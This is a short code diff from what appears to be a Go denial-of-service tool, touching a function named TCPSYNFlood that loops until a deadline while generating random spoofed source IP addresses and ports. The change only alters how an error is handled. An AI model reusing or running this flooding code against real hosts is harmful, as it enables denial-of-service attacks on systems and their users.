@@ -18,7 +18,7 @@ func TCPSYNFlood(targetIP, targetPort, payload string, attackDuration int) {
 	// Define the deadline for the attack to stop.
 	end := time.Now().Add(time.Duration(attackDuration) * time.Second)
 
-	srcIP, err := utils.ParseIPGen("0.0.0.0/0")
+	srcIP := utils.ParseIPGen("0.0.0.0/0")
 
 	srcPort := utils.RandomPort()
 	for time.Now().Before(end) {
